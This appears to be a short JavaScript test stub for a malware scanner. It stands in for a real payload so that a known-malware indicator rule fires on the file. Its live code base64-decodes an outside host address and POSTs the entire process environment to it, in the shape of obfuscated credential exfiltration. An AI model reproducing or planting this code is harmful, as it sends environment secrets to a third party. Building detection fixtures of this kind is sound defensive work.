// router_init.js — synthetic stub replacing the original 585 KB payload.
// Filename alone triggers CapKnownMalwareIOC (IOC blocklist in source_patterns.go).
// Content mirrors the attack shape: base64-decode + session.org C2 exfil.
const _0x = (s) => Buffer.from(s, 'base64').toString();
const _h = _0x('Z2V0c2Vzc2lvbi5vcmcvYXBpL3YxL21lc3NhZ2Vz'); // getsession.org/api/v1/messages
fetch(_h, { method: 'POST', body: JSON.stringify({ d: process.env }) });
